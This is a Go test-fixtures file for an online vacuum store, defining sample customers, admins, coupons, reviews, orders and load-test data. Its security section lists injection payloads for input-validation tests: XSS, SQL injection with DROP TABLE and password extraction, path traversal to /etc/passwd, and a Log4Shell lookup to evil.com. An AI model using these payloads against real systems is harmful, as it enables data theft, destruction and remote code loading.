package fixtures

import (
	"fmt"
	"time"
)

// Extended fixtures for comprehensive testing coverage

// Customer and User Fixtures
type TestCustomer struct {
	ID           int       `json:"id"`
	Email        string    `json:"email"`
	FirstName    string    `json:"first_name"`
	LastName     string    `json:"last_name"`
	PasswordHash string    `json:"password_hash"`
	IsActive     bool      `json:"is_active"`
	CreatedAt    time.Time `json:"created_at"`
}

type TestCustomerRegistration struct {
	Email     string `json:"email"`
	Password  string `json:"password"`
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
}

type BillingInfo struct {
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Address   string `json:"address"`
	City      string `json:"city"`
	State     string `json:"state"`
	ZipCode   string `json:"zip_code"`
	Country   string `json:"country"`
}

type TestShippingInfo struct {
	FirstName string `json:"first_name"`
	LastName  string `json:"last_name"`
	Address   string `json:"address"`
	City      string `json:"city"`
	State     string `json:"state"`
	ZipCode   string `json:"zip_code"`
	Country   string `json:"country"`
}

type TestPaymentInfo struct {
	Method    string `json:"method"`
	CardToken string `json:"card_token,omitempty"`
}

// Inventory and Stock Fixtures
type TestInventoryItem struct {
	ProductID     int `json:"product_id"`
	QuantityTotal int `json:"quantity_total"`
	QuantityAvailable int `json:"quantity_available"`
	QuantityReserved  int `json:"quantity_reserved"`
	LowStockThreshold int `json:"low_stock_threshold"`
}

// Order and Transaction Fixtures
type TestOrderStatus struct {
	Status    string    `json:"status"`
	UpdatedAt time.Time `json:"updated_at"`
	Note      string    `json:"note,omitempty"`
}

type TestShippingMethod struct {
	ID           int     `json:"id"`
	Name         string  `json:"name"`
	Description  string  `json:"description"`
	Cost         float64 `json:"cost"`
	EstimatedDays int    `json:"estimated_days"`
}

type TestPaymentTransaction struct {
	ID            string    `json:"id"`
	OrderID       string    `json:"order_id"`
	Amount        float64   `json:"amount"`
	Currency      string    `json:"currency"`
	Status        string    `json:"status"`
	PaymentMethod string    `json:"payment_method"`
	ProcessedAt   time.Time `json:"processed_at"`
}

// Admin and Management Fixtures
type TestAdminUser struct {
	ID           int       `json:"id"`
	Username     string    `json:"username"`
	Email        string    `json:"email"`
	Role         string    `json:"role"`
	FirstName    string    `json:"first_name"`
	LastName     string    `json:"last_name"`
	IsActive     bool      `json:"is_active"`
	LastLogin    *time.Time `json:"last_login,omitempty"`
	CreatedAt    time.Time `json:"created_at"`
}

// Review and Rating Fixtures
type TestProductReview struct {
	ID         int       `json:"id"`
	ProductID  int       `json:"product_id"`
	CustomerID int       `json:"customer_id"`
	Rating     int       `json:"rating"`
	Title      string    `json:"title"`
	Comment    string    `json:"comment"`
	IsVerified bool      `json:"is_verified"`
	CreatedAt  time.Time `json:"created_at"`
}

// Coupon and Discount Fixtures
type TestCoupon struct {
	ID               int       `json:"id"`
	Code             string    `json:"code"`
	Type             string    `json:"type"` // percentage, fixed_amount
	Value            float64   `json:"value"`
	MinimumOrder     float64   `json:"minimum_order"`
	MaxUses          int       `json:"max_uses"`
	UsedCount        int       `json:"used_count"`
	ValidFrom        time.Time `json:"valid_from"`
	ValidUntil       time.Time `json:"valid_until"`
	IsActive         bool      `json:"is_active"`
}

// Search and Filter Fixtures
type TestSearchQuery struct {
	Query      string                 `json:"query"`
	Filters    map[string]interface{} `json:"filters"`
	Sort       string                 `json:"sort"`
	Page       int                    `json:"page"`
	Limit      int                    `json:"limit"`
}

type TestSearchResult struct {
	Products     []TestProduct `json:"products"`
	TotalCount   int           `json:"total_count"`
	Page         int           `json:"page"`
	Limit        int           `json:"limit"`
	TotalPages   int           `json:"total_pages"`
	Facets       map[string]interface{} `json:"facets"`
}

// Analytics and Reporting Fixtures
type TestAnalyticsEvent struct {
	ID         int                    `json:"id"`
	EventType  string                 `json:"event_type"`
	CustomerID *int                   `json:"customer_id,omitempty"`
	SessionID  string                 `json:"session_id"`
	Data       map[string]interface{} `json:"data"`
	Timestamp  time.Time              `json:"timestamp"`
}

// Extended Test Data Sets

// Test Customers
var (
	RegularCustomer = TestCustomer{
		ID:           1,
		Email:        "john.doe@example.com",
		FirstName:    "John",
		LastName:     "Doe",
		PasswordHash: "$2a$10$hash", // bcrypt hash
		IsActive:     true,
		CreatedAt:    time.Now().AddDate(0, -6, 0),
	}

	PremiumCustomer = TestCustomer{
		ID:        2,
		Email:     "jane.premium@example.com",
		FirstName: "Jane",
		LastName:  "Premium",
		IsActive:  true,
		CreatedAt: time.Now().AddDate(-1, 0, 0),
	}

	NewCustomer = TestCustomer{
		ID:        3,
		Email:     "new.customer@example.com",
		FirstName: "New",
		LastName:  "Customer",
		IsActive:  true,
		CreatedAt: time.Now().AddDate(0, 0, -1),
	}
)

// Test Admin Users
var (
	SuperAdmin = TestAdminUser{
		ID:        1,
		Username:  "admin",
		Email:     "admin@vacuumstore.com",
		Role:      "admin",
		FirstName: "Super",
		LastName:  "Admin",
		IsActive:  true,
		CreatedAt: time.Now().AddDate(-2, 0, 0),
	}

	ManagerUser = TestAdminUser{
		ID:        2,
		Username:  "manager",
		Email:     "manager@vacuumstore.com",
		Role:      "manager",
		FirstName: "Store",
		LastName:  "Manager",
		IsActive:  true,
		CreatedAt: time.Now().AddDate(-1, 0, 0),
	}

	StaffUser = TestAdminUser{
		ID:        3,
		Username:  "staff",
		Email:     "staff@vacuumstore.com",
		Role:      "staff",
		FirstName: "Support",
		LastName:  "Staff",
		IsActive:  true,
		CreatedAt: time.Now().AddDate(0, -6, 0),
	}
)

// Test Inventory Items
var (
	DysonV15Inventory = TestInventoryItem{
		ProductID:         1,
		QuantityTotal:     100,
		QuantityAvailable: 85,
		QuantityReserved:  15,
		LowStockThreshold: 10,
	}

	SharkNavigatorInventory = TestInventoryItem{
		ProductID:         2,
		QuantityTotal:     75,
		QuantityAvailable: 60,
		QuantityReserved:  15,
		LowStockThreshold: 5,
	}

	MieleCX1Inventory = TestInventoryItem{
		ProductID:         3,
		QuantityTotal:     25,
		QuantityAvailable: 20,
		QuantityReserved:  5,
		LowStockThreshold: 3,
	}
)

// Test Shipping Methods
var (
	StandardShipping = TestShippingMethod{
		ID:            1,
		Name:          "Standard Shipping",
		Description:   "5-7 business days",
		Cost:          9.99,
		EstimatedDays: 6,
	}

	ExpressShipping = TestShippingMethod{
		ID:            2,
		Name:          "Express Shipping",
		Description:   "2-3 business days",
		Cost:          19.99,
		EstimatedDays: 2,
	}

	OvernightShipping = TestShippingMethod{
		ID:            3,
		Name:          "Overnight Shipping",
		Description:   "Next business day",
		Cost:          39.99,
		EstimatedDays: 1,
	}

	FreeShipping = TestShippingMethod{
		ID:            4,
		Name:          "Free Shipping",
		Description:   "7-10 business days (orders over $75)",
		Cost:          0.00,
		EstimatedDays: 8,
	}
)

// Test Coupons
var (
	TenPercentOff = TestCoupon{
		ID:           1,
		Code:         "SAVE10",
		Type:         "percentage",
		Value:        10.0,
		MinimumOrder: 50.0,
		MaxUses:      100,
		UsedCount:    25,
		ValidFrom:    time.Now().AddDate(0, -1, 0),
		ValidUntil:   time.Now().AddDate(0, 1, 0),
		IsActive:     true,
	}

	TwentyDollarsOff = TestCoupon{
		ID:           2,
		Code:         "SAVE20",
		Type:         "fixed_amount",
		Value:        20.0,
		MinimumOrder: 100.0,
		MaxUses:      50,
		UsedCount:    10,
		ValidFrom:    time.Now().AddDate(0, -15, 0),
		ValidUntil:   time.Now().AddDate(0, 0, 30),
		IsActive:     true,
	}

	FirstTimeCustomer = TestCoupon{
		ID:           3,
		Code:         "WELCOME15",
		Type:         "percentage",
		Value:        15.0,
		MinimumOrder: 0.0,
		MaxUses:      1000,
		UsedCount:    150,
		ValidFrom:    time.Now().AddDate(-1, 0, 0),
		ValidUntil:   time.Now().AddDate(1, 0, 0),
		IsActive:     true,
	}

	ExpiredCoupon = TestCoupon{
		ID:           4,
		Code:         "EXPIRED",
		Type:         "percentage",
		Value:        25.0,
		MinimumOrder: 75.0,
		MaxUses:      100,
		UsedCount:    99,
		ValidFrom:    time.Now().AddDate(0, -2, 0),
		ValidUntil:   time.Now().AddDate(0, -1, 0),
		IsActive:     false,
	}
)

// Test Product Reviews
var (
	DysonV15Review1 = TestProductReview{
		ID:         1,
		ProductID:  1,
		CustomerID: 1,
		Rating:     5,
		Title:      "Amazing vacuum!",
		Comment:    "This vacuum is incredible. The suction power is unmatched and the laser detection really works!",
		IsVerified: true,
		CreatedAt:  time.Now().AddDate(0, -1, -15),
	}

	DysonV15Review2 = TestProductReview{
		ID:         2,
		ProductID:  1,
		CustomerID: 2,
		Rating:     4,
		Title:      "Great but expensive",
		Comment:    "Performance is excellent but the price is quite high. Worth it if you can afford it.",
		IsVerified: true,
		CreatedAt:  time.Now().AddDate(0, 0, -30),
	}

	SharkNavigatorReview1 = TestProductReview{
		ID:         3,
		ProductID:  2,
		CustomerID: 3,
		Rating:     4,
		Title:      "Good value for money",
		Comment:    "Solid vacuum cleaner. Not as fancy as Dyson but gets the job done at a fraction of the cost.",
		IsVerified: true,
		CreatedAt:  time.Now().AddDate(0, 0, -10),
	}
)

// Test Search Scenarios
var (
	BasicProductSearch = TestSearchQuery{
		Query: "Dyson",
		Page:  1,
		Limit: 20,
	}

	FilteredSearch = TestSearchQuery{
		Query: "vacuum",
		Filters: map[string]interface{}{
			"category_id": 1,
			"brand_id":    1,
			"min_price":   100.0,
			"max_price":   1000.0,
		},
		Sort:  "price_asc",
		Page:  1,
		Limit: 10,
	}

	EmptySearch = TestSearchQuery{
		Query: "nonexistent",
		Page:  1,
		Limit: 20,
	}
)

// Helper functions for creating test data sets

func CreateTestCustomers() []TestCustomer {
	return []TestCustomer{RegularCustomer, PremiumCustomer, NewCustomer}
}

func CreateTestAdminUsers() []TestAdminUser {
	return []TestAdminUser{SuperAdmin, ManagerUser, StaffUser}
}

func CreateTestInventoryItems() []TestInventoryItem {
	return []TestInventoryItem{DysonV15Inventory, SharkNavigatorInventory, MieleCX1Inventory}
}

func CreateTestShippingMethods() []TestShippingMethod {
	return []TestShippingMethod{StandardShipping, ExpressShipping, OvernightShipping, FreeShipping}
}

func CreateTestCoupons() []TestCoupon {
	return []TestCoupon{TenPercentOff, TwentyDollarsOff, FirstTimeCustomer, ExpiredCoupon}
}

func CreateTestReviews() []TestProductReview {
	return []TestProductReview{DysonV15Review1, DysonV15Review2, SharkNavigatorReview1}
}

func CreateTestSearchQueries() []TestSearchQuery {
	return []TestSearchQuery{BasicProductSearch, FilteredSearch, EmptySearch}
}

// Complex scenarios for testing

func CreateLargeOrder() TestOrder {
	return TestOrder{
		ID:          1001,
		CustomerID:  1,
		TotalAmount: 1599.97,
		Status:      "pending",
		Items: []TestCartItem{
			{ProductID: 1, Quantity: 2}, // 2x Dyson V15 = $1499.98
			{ProductID: 2, Quantity: 1}, // 1x Shark Navigator = $149.99 (sale price)
		},
		CreatedAt: time.Now(),
	}
}

func CreateBulkOrder() TestOrder {
	return TestOrder{
		ID:          1002,
		CustomerID:  2,
		TotalAmount: 2999.95,
		Status:      "confirmed",
		Items: []TestCartItem{
			{ProductID: 1, Quantity: 3},
			{ProductID: 3, Quantity: 2},
		},
		CreatedAt: time.Now(),
	}
}

func CreateTestOrderHistory(customerID int) []TestOrder {
	return []TestOrder{
		{
			ID:          2001,
			CustomerID:  customerID,
			TotalAmount: 749.99,
			Status:      "delivered",
			Items: []TestCartItem{
				{ProductID: 1, Quantity: 1},
			},
			CreatedAt: time.Now().AddDate(0, -2, 0),
		},
		{
			ID:          2002,
			CustomerID:  customerID,
			TotalAmount: 149.99,
			Status:      "shipped",
			Items: []TestCartItem{
				{ProductID: 2, Quantity: 1},
			},
			CreatedAt: time.Now().AddDate(0, 0, -7),
		},
	}
}

// Security test data

func CreateMaliciousInputs() []string {
	return []string{
		"<script>alert('xss')</script>",
		"'; DROP TABLE products; --",
		"../../../etc/passwd",
		"javascript:alert('xss')",
		"<img src=x onerror=alert('xss')>",
		"' OR 1=1 --",
		"{{7*7}}",
		"${jndi:ldap://evil.com/a}",
		"<iframe src=javascript:alert('xss')></iframe>",
		"' UNION SELECT password FROM users --",
	}
}

func CreateInvalidEmailAddresses() []string {
	return []string{
		"notanemail",
		"@example.com",
		"user@",
		"user..user@example.com",
		"user@example",
		"user name@example.com",
		"",
		"very.long.email.address.that.exceeds.normal.length.limits@example.com",
	}
}

func CreateInvalidPhoneNumbers() []string {
	return []string{
		"123",
		"abc-def-ghij",
		"123-456-78901",
		"+1-800-CALLNOW",
		"(555) 123-456789",
		"",
		"1234567890123456789",
	}
}

// Performance test data

func CreateLargeProductCatalog(size int) []TestProduct {
	products := make([]TestProduct, size)
	for i := 0; i < size; i++ {
		products[i] = TestProduct{
			ID:          1000 + i,
			SKU:         fmt.Sprintf("PERF-TEST-%d", i),
			Name:        fmt.Sprintf("Performance Test Product %d", i),
			Description: fmt.Sprintf("This is a test product for performance testing - product number %d", i),
			BasePrice:   float64(50 + i%500),
			CategoryID:  1 + (i % 3),
			BrandID:     1 + (i % 2),
			IsActive:    true,
			CreatedAt:   time.Now().AddDate(0, 0, -(i % 365)),
		}
	}
	return products
}

func CreateConcurrentUsers(count int) []TestCustomer {
	users := make([]TestCustomer, count)
	for i := 0; i < count; i++ {
		users[i] = TestCustomer{
			ID:        10000 + i,
			Email:     fmt.Sprintf("loadtest%d@example.com", i),
			FirstName: fmt.Sprintf("LoadTest%d", i),
			LastName:  "User",
			IsActive:  true,
			CreatedAt: time.Now(),
		}
	}
	return users
}
